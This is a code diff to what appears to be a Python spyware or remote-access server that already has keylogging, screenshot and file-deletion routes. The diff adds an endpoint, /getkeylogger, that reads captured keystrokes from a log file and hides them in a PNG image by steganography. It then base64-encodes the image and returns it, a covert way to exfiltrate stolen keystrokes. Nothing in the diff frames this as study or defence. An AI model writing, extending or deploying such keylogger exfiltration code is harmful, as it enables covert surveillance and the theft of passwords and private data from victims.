@@ -9,6 +9,7 @@ import sqlite3
 import pathlib
 import pyautogui
 import base64
+from utils import stegano_decrypt, stegano_encrypt
 
 mydb = sqlite3.connect("user.db")
 
@@ -110,6 +111,16 @@ def delete_file():
 # do the keylog
 def keylogger():
     start_key_logger()
+    return 'keylogger started'
+
+# https://pypi.org/project/stegano/
+@app.get("/getkeylogger")
+def getkeylogger():
+    with open('./file.log', 'r') as f:
+        data = f.read()
+    nidedata = stegano_encrypt(data, './test.png')
+    base64data = base64.b64encode(nidedata).decode()
+    return base64data
     
 @app.route('/shot',methods=["POST","GET"])
 # do the screenshot
